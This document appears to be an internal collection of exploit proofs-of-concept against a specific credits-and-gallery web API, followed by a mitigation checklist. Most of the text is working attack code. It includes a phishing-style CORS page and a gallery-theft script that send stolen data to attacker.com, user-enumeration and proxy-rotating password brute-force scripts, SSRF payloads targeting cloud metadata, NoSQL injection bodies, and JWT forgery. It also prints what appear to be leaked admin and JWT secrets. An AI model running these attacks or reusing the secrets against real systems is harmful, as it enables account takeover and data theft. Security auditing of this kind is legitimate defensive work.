# Security Exploit Proof-of-Concepts

⚠️ **WARNING: These are for security testing only. Do not use against systems you don't own.**

## Exploit 1: CORS Bypass - Stealing User Data

### Description
With permissive CORS (`ALLOWED_ORIGINS=`), any website can make authenticated requests.

### Exploit Code
```html
<!-- attacker-site.com/steal.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Free Credits Generator</title>
</head>
<body>
  <h1>Click here for free credits!</h1>
  <script>
    // Wait for user to be logged in, then steal their data
    setTimeout(() => {
      // Steal user info
      fetch('https://your-api.com/api/user/info', {
        method: 'POST',
        credentials: 'include', // Sends cookies/tokens
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + localStorage.getItem('token') // If token stored
        },
        body: JSON.stringify({
          walletAddress: '0x123...' // Try to enumerate
        })
      })
      .then(r => r.json())
      .then(data => {
        // Send stolen data to attacker
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });

      // Steal credits balance
      fetch('https://your-api.com/api/user/credits', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: '0x123...' })
      })
      .then(r => r.json())
      .then(data => {
        console.log('Stolen credits:', data);
      });
    }, 2000);
  </script>
</body>
</html>
```

### Impact
- Steal user data without their knowledge
- Enumerate users
- View credit balances

---

## Exploit 2: User Enumeration

### Description
`/api/user/info` endpoint allows unauthenticated user enumeration.

### Exploit Code
```bash
#!/bin/bash
# enumerate-users.sh

API_URL="https://your-api.com/api/user/info"

# Enumerate by wallet addresses
for i in {1..1000}; do
  wallet="0x$(openssl rand -hex 20)"
  response=$(curl -s -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d "{\"walletAddress\": \"$wallet\"}")
  
  if echo "$response" | grep -q '"user":null'; then
    echo "Wallet $wallet: Not found"
  else
    echo "Wallet $wallet: FOUND!"
    echo "$response" | jq .
  fi
done

# Enumerate by email
emails=("admin@example.com" "test@example.com" "user@example.com")
for email in "${emails[@]}"; do
  response=$(curl -s -X POST "$API_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\"}")
  
  if echo "$response" | grep -q '"user":null'; then
    echo "Email $email: Not found"
  else
    echo "Email $email: FOUND!"
    echo "$response" | jq .
  fi
done
```

### Impact
- Discover valid user accounts
- Privacy violation
- Targeted attacks

---

## Exploit 3: Gallery Access Control Bypass

### Description
Authenticated users can view any other user's gallery.

### Exploit Code
```javascript
// attacker.js
async function stealGallery(victimWallet) {
  // First, authenticate as yourself
  const loginResponse = await fetch('https://your-api.com/api/auth/signin', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'attacker@example.com',
      password: 'attacker_password'
    })
  });
  
  const { token } = await loginResponse.json();
  
  // Now access victim's gallery
  const galleryResponse = await fetch('https://your-api.com/api/user/gallery', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`
    },
    body: JSON.stringify({
      walletAddress: victimWallet // Victim's wallet
    })
  });
  
  const gallery = await galleryResponse.json();
  console.log('Stolen gallery:', gallery);
  
  // Save to attacker's server
  await fetch('https://attacker.com/save-gallery', {
    method: 'POST',
    body: JSON.stringify(gallery)
  });
}

// Use it
stealGallery('0xVictimWalletAddress...');
```

### Impact
- View any user's private gallery
- Privacy violation
- Content theft

---

## Exploit 4: Admin Secret Brute Force

### Description
Admin secret is only 32 hex characters (16 bytes). With rate limiting of 10 requests per 15 minutes, brute force is slow but possible.

### Exploit Code
```python
# brute_force_admin.py
import requests
import itertools
import string
import time

API_URL = "https://your-api.com/api/admin/add-credits"
KNOWN_PREFIX = "30df28efd892d65081b26652cedb7a26dcfa6d3e79067e2c0fff8a5977458f00"

# If we know the format, we can try variations
# Or if secret was leaked partially

def try_admin_secret(secret):
    response = requests.post(
        API_URL,
        headers={
            "Authorization": f"Bearer {secret}",
            "Content-Type": "application/json"
        },
        json={
            "walletAddress": "0xAttackerWallet",
            "credits": 1000
        }
    )
    
    if response.status_code == 200:
        print(f"SUCCESS! Secret: {secret}")
        return True
    return False

# If secret is in backend.env and file is accessible
# Or if we can guess based on pattern
# This is slow but possible with enough time
```

### Impact
- Gain admin access
- Grant unlimited credits
- Access all user data
- System compromise

---

## Exploit 5: SSRF via Video Metadata

### Description
If user input reaches `videoMetadata.ts`, SSRF is possible.

### Exploit Code
```javascript
// ssrf-exploit.js
// If video URL can be user-controlled:

const maliciousVideoUrl = "http://localhost:27017"; // MongoDB
// or
const maliciousVideoUrl = "http://169.254.169.254/latest/meta-data/"; // AWS metadata
// or
const maliciousVideoUrl = "http://internal-api:8080/admin";

// Submit generation request with malicious URL
fetch('https://your-api.com/api/generate/video', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer YOUR_TOKEN',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    videoInput: maliciousVideoUrl,
    // ... other params
  })
});
```

### Impact
- Access internal services
- Port scanning
- Data exfiltration from internal APIs
- Cloud metadata access (AWS, GCP, Azure)

---

## Exploit 6: NoSQL Injection (If deepSanitize is Bypassed)

### Description
While `deepSanitize` exists, if it's not applied everywhere, NoSQL injection is possible.

### Exploit Code
```javascript
// nosql-injection.js
// If a route doesn't use deepSanitize:

fetch('https://your-api.com/api/user/info', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    walletAddress: {
      $ne: null  // NoSQL injection - find all users
    }
  })
});

// Or:
body: JSON.stringify({
  email: {
    $regex: ".*admin.*"  // Find admin users
  }
});

// Or:
body: JSON.stringify({
  credits: {
    $gt: 1000  // Find users with > 1000 credits
  }
});
```

### Impact
- Bypass authentication
- Data enumeration
- Unauthorized data access

---

## Exploit 7: JWT Token Forgery (If Secret is Known)

### Description
If `JWT_SECRET` is leaked, attackers can forge tokens.

### Exploit Code
```javascript
// jwt-forge.js
const jwt = require('jsonwebtoken');

// If secret is known from backend.env leak
const SECRET = "ce5e025b87ce0e56c625dbb7045032b9f29ecac8478cf9a7789c58695e585e08";

// Forge token for any user
const forgedToken = jwt.sign(
  {
    userId: "admin_user_id",
    email: "admin@example.com",
    type: "access"
  },
  SECRET,
  { expiresIn: '24h' }
);

// Use forged token
fetch('https://your-api.com/api/user/me', {
  headers: {
    'Authorization': `Bearer ${forgedToken}`
  }
});
```

### Impact
- Impersonate any user
- Access all user data
- Perform actions as any user

---

## Exploit 8: Rate Limiting Bypass

### Description
IP-based rate limiting can be bypassed with proxies/VPNs.

### Exploit Code
```python
# rate_limit_bypass.py
import requests
import random

# List of proxy IPs
proxies = [
    {"http": "http://proxy1:8080"},
    {"http": "http://proxy2:8080"},
    # ... more proxies
]

def brute_force_with_proxies(email, password_list):
    for password in password_list:
        proxy = random.choice(proxies)
        try:
            response = requests.post(
                "https://your-api.com/api/auth/signin",
                json={"email": email, "password": password},
                proxies=proxy,
                timeout=5
            )
            if response.status_code == 200:
                print(f"SUCCESS! Password: {password}")
                return password
        except:
            continue
    return None
```

### Impact
- Brute force attacks
- Account takeover
- DDoS

---

## Mitigation Checklist

After reviewing these exploits, ensure:

- [ ] CORS is restricted to specific origins
- [ ] All secrets are rotated and not in version control
- [ ] Admin routes require stronger authentication
- [ ] User info endpoints require authentication or only return public data
- [ ] Gallery endpoints verify user ownership
- [ ] CSRF protection is implemented
- [ ] All user inputs are validated for SSRF
- [ ] Rate limiting uses multiple factors (IP + fingerprint + account)
- [ ] JWT tokens have shorter expiration
- [ ] All routes use `deepSanitize` middleware
- [ ] Error messages don't leak information
- [ ] Security headers are properly configured

---

## Responsible Disclosure

If you find these vulnerabilities in a production system:

1. **DO NOT** exploit them maliciously
2. Report to the security team immediately
3. Allow time for fixes before public disclosure
4. Follow responsible disclosure practices

